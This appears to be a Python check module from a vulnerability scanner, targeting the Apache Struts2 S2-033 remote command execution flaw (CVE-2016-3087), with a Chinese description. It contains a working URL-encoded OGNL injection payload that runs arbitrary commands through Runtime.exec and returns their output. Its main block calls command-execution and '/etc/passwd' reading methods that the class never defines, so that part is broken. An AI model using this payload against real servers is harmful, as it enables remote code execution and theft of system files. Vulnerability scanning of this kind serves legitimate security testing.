#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_033_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2016-3087',
            'description': 'Struts2 S2-033漏洞可执行任意命令, 影响范围为: Struts 2.3.20 - Struts Struts 2.3.28 (2.3.20.3和2.3.24.3除外)',
            'date': '2016-03-10',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload = '''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command='''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.payload + 'echo ' + self.capta, headers = self.headers)
            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                return True
            
        except Exception as e:
            # print(e)
            pass
        
if  __name__ == "__main__":
    S2_033 = S2_033_BaseVerify('http://127.0.0.1:8080/S2-033/orders/3')
    print(S2_033.cmd('id'))
    print(S2_033.read('/etc/passwd'))
